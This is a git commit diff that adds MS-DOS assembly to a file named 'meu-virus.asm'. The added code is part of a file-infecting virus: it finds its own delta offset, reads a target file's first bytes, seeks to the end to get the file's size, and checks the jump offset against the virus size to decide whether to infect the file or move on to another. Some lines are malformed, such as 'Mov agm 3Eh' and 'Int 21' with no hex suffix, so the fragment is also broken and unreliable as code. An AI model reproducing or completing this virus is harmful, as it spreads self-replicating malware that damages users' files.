ae150a6a3cc32e5e809adead7aab8cfc763ea4be
DIEGO <diegocracker@gmail.com>
2023-01-25 22:31:40 -0300

    Update meu-virus.asm

--- meu-virus.asm
+++ meu-virus.asm
@@ -22,3 +22,18 @@ falso_proc  endp
 
 	pop bp
 	sub bp, 107h
+	
+	mov ah, 3Fh ;Read first three
+mov 	cx, 3 ;bytes of the file
+lea	dx, [bp+offset buffer] ;to the buffer
+int 	21h
+mov 	ax, 4202h ;SEEK from EOF
+xor 	cx, cx ;DX:CX = offset
+xor 	dx, dx ;Returns filesize
+int 	21h ;in DX:AX
+Sub 	ax, virus_size + 3
+cmp 	word ptr [bp+offset buffer+1], ax
+jnz 	infect_it
+bomb_out:
+Mov 	agm 3Eh ;else close the file
+Int 	21 ; and go find another
